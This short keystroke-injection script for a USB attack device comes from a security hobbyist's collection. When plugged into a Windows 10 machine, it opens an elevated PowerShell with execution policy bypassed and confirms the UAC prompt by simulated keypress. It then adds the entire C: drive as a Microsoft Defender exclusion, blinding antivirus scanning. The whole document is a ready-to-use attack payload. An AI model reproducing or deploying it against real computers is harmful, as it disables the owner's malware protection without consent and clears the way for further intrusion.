// =============================================================================
// Title: Exclude C:/ Drive.
// Author: @beigeworm | https://github.com/beigeworm
// Description: Exclude C:/ Drive from future Microsoft Defender scans.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// startup

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(2000);
press("ALT y");
delay(4000);
type("Add-MpPreference -ExclusionPath C:\\ ; exit");
press("ENTER")
